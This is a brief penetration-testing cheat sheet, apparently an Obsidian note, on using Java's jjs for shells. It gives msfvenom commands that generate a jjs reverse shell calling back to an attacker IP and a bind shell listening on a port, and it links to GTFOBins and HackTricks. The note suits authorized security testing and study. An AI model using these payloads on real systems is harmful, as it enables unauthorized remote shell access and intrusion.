# Manual

## 01 - Common Files

```
/usr/bin/java
/usr/lib/jvm/default/bin/java
```

## 02 - Generate Payloads

### 2.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>
```

### 2.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_jjs lport=<PORT>
```

## 03 - Compile After Delivery

^ae2cdb

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Cross Platform/Code Execution/Java/Manual#^335fe5]]

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Cross Platform/Code Execution/Java/Manual#^3775c1]]

---
## References

### GTFOBins

- [GTFOBins: jjs](https://gtfobins.github.io/gtfobins/jjs/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)